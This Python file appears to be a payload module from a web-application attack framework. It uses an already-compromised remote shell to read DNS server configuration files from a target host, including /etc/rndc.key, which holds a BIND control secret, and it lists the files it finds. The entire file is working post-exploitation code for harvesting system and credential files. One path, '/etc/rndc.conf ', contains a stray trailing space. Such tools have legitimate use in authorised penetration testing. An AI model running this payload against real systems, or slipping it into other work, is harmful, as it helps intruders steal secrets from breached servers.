from plugins.attack.payloads.base_payload import base_payload
from core.ui.consoleUi.tables import table


class dns_config_files(base_payload):
    '''
    This payload shows DNS Server configuration files
    '''
    def api_read(self, parameters):
        result = {}
        files = []

        files.append('/etc/named.conf')
        files.append('/etc/bind/named.conf.local')
        files.append('/etc/bind/named.conf')
        files.append('/var/named/named.conf')
        files.append('/var/named/private.rev')
        files.append('/etc/bind/named.conf.options')
        files.append('/etc/resolv.conf')
        files.append('/etc/rndc.conf ')
        files.append('/etc/rndc.key')

        for file in files:
            content = self.shell.read(file)
            if content:
                result.update({file:content})
        return result
        
    def run_read(self, parameters):
        api_result = self.api_read( parameters )
                
        if not api_result:
            return 'DNS configuration files not found.'
        else:
            rows = []
            rows.append( ['DNS configuration files',] )
            rows.append( [] )
            for filename in api_result:
                rows.append( [filename,] )
                    
            result_table = table( rows )
            result_table.draw( 80 )
            return
        